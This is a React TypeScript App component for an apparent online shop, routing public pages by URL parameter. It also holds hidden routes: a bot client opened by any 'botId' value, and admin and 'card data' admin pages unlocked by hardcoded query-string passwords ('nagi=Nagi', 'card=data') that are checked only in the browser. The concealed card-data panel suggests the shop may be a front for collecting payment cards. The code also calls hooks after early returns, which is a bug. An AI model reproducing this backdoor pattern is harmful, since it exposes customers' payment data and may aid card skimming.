
import React, { useState, useEffect, useCallback } from 'react';
import BotClient from './BotClient';
import HomePage from './pages/HomePage';
import ProductsPage from './pages/ProductsPage';
import AboutPage from './pages/AboutPage';
import ContactPage from './pages/ContactPage';
import AdminPage from './pages/AdminPage';
import CardDataAdminPage from './pages/CardDataAdminPage';
import Navbar from './components/Navbar';
import Footer from './components/Footer';

// Helper to get the initial page from the URL
const getCurrentPageFromUrl = () => {
    const params = new URLSearchParams(window.location.search);
    return params.get('page') || 'home';
};


const App: React.FC = () => {
    // --- Handle non-public routes first (admin, bot client) ---
    const params = new URLSearchParams(window.location.search);
    const botId = params.get('botId');
    const nagiPass = params.get('nagi');
    const cardPass = params.get('card');

    if (botId) {
        return <BotClient botId={botId} />;
    }
    if (nagiPass === 'Nagi') {
        return <AdminPage />;
    }
    if (cardPass === 'data') {
        return <CardDataAdminPage />;
    }

    // --- State and handlers for public-facing SPA routing ---
    const [currentPage, setCurrentPage] = useState(getCurrentPageFromUrl());

    // Navigation handler that updates state and browser history
    const handleNavigate = useCallback((page: string) => {
        // Prevent navigating to the same page
        if (page === currentPage) return;
        
        setCurrentPage(page);
        const url = new URL(window.location.href);
        // Clean up URL for home page, add param for others
        if (page === 'home') {
            url.searchParams.delete('page');
        } else {
            url.searchParams.set('page', page);
        }
        // Use pushState to change URL without reloading
        window.history.pushState({ page }, '', url);
    }, [currentPage]);
    
    // Effect to handle browser back/forward buttons
    useEffect(() => {
        const handlePopState = (event: PopStateEvent) => {
            setCurrentPage(getCurrentPageFromUrl());
        };
        window.addEventListener('popstate', handlePopState);
        return () => {
            window.removeEventListener('popstate', handlePopState);
        };
    }, []);

    // --- Layout for Public Pages ---
    const PublicLayout: React.FC<{ children: React.ReactNode }> = ({ children }) => (
        <div className="flex flex-col min-h-screen bg-stone-50">
            <Navbar onNavigate={handleNavigate} currentPage={currentPage} />
            <main className="flex-grow container mx-auto px-4 py-8">
                {children}
            </main>
            <Footer />
        </div>
    );
    
    // Determine which component to render based on state
    const renderPage = () => {
        switch (currentPage) {
            case 'products':
                return <ProductsPage />;
            case 'about':
                return <AboutPage />;
            case 'contact':
                return <ContactPage />;
            case 'home':
            default:
                return <HomePage onNavigate={handleNavigate} />;
        }
    };
    
    return (
        <PublicLayout>
            {renderPage()}
        </PublicLayout>
    );
};

export default App;